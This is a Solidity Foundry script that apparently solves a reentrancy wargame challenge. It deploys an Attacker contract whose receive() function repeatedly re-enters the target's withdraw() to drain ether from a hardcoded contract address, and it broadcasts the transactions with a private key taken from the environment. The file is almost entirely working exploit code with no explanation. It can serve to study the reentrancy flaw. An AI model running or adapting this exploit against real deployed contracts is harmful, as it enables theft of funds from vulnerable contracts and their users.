// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Reentrance} from "../src/Reentrancy.sol";
import {Script, console} from "forge-std/script.sol";

contract ReentrancySolution is Script {
    Reentrance reentrance = Reentrance(0xDc8B3CAB1d2E0c4Fd044B9bAcFc05960066800E4);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Attacker attack = new Attacker{value: 0.001 ether}();

        attack.withdraw();
        console.log("Amount got is :", reentrance.balanceOf(msg.sender));
        vm.stopBroadcast();
    }
}

contract Attacker {
    Reentrance reentrance = Reentrance(0xDc8B3CAB1d2E0c4Fd044B9bAcFc05960066800E4);

    constructor() public payable {
        reentrance.donate{value: 0.001 ether}(address(this));
    }

    function withdraw() public {
        reentrance.withdraw(0.001 ether);
        (bool result,) = msg.sender.call{value: 0.002 ether}("");
    }

    receive() external payable {
        reentrance.withdraw(0.001 ether);
    }
}
